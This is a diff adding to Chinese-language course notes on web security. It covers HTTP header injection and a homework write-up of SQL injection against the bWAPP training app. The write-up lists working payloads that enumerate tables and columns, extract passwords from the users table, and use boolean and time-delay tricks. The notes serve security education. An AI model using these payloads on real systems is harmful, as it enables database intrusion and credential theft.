@@ -1,5 +1,7 @@
 # GeekBang course - Web Security
 
+> refrence: [SQL注入的一些学习](https://www.cnblogs.com/0x7e/p/13748715.html)
+
 ## Web安全之后端安全
 
 ### 文件上传漏洞
@@ -109,3 +111,56 @@
   - 报错型注入
 
   - 可多语句查询注入
+
+- HTTP头注入
+
+  - 针对HTTP的请求头，如果不加以过滤或者转义，在直接与数据库交互的过程中容易被利用进行SQL注入攻击，即HTTP头注入。
+
+    - 常见场景：访问Web server时，web server会从HTTP Header中取出浏览器信息、IP地址、HOST信息等存储到数据库中。
+
+  - 作业：
+
+    - SQL注入：
+
+      我们在课程中已经知道数据库名称为bWAPP，注意每一次只能返回一行，所以要用limit 1
+
+      1. information_schema.tables为数据库中表数据信息
+
+         `111', (select table_name from information_schema.tables where table_schema=database() limit 1 offset 0)); #`
+
+         这样可以成功查询数据表，调整offset偏移量控制返回的条数，可以发现offset为3时候，返回的是数据库表名为users，即我们所想查的表
+
+      2. 查询user中包含的几个字段
+
+         infomation_schema.columns很重要，查询数据库中行数据信息
+
+         `111', (select column_name from information_schema.columns where table_name='users' limit 1 offset 2)); #`
+
+         利用上面的指令，修改offser偏移量，可以获得id, login, password分别位于偏移0，1，2处。
+
+      3. 查询具体敏感数据
+
+         `111', (select password from users limit 1 offset 1)); #`
+
+         直接对users数据表的第一个id字段进行查询，然后查询password 和 login，换上offset即可，重复上面的操作既可以完成SQL注入攻击。
+
+    - 两种以上不同函数完成
+
+      因为可以直接执行整句逻辑，很自由，下面两种方法都可以帮助我们进行SQL注入
+
+      1. 布尔注入
+
+         substring(version(),1,5) = 'bWAPP' 时返回 0 意味着我们还可以使用布尔进行SQL注入,需要编写简本
+
+         `111', substring(database(),1,5)='bWAPP'); #`
+
+      2. 时间延迟注入
+
+         sleep(3) 与布尔型同理,但是可以应对没有回显情况.通过判断延时是否被执行从而推断出SQL条件是否正确.因为时间延迟注入中要前置条件为真,所以可以看作布尔注入升级版
+
+         `111', substring(database(),1,1)='b' and sleep(2)); #`
+
+- 报错注入：
+
+  - 参考：[报错注入原理分析以及python写报错注入](https://blog.csdn.net/m0_46304840/article/details/104733922)
+
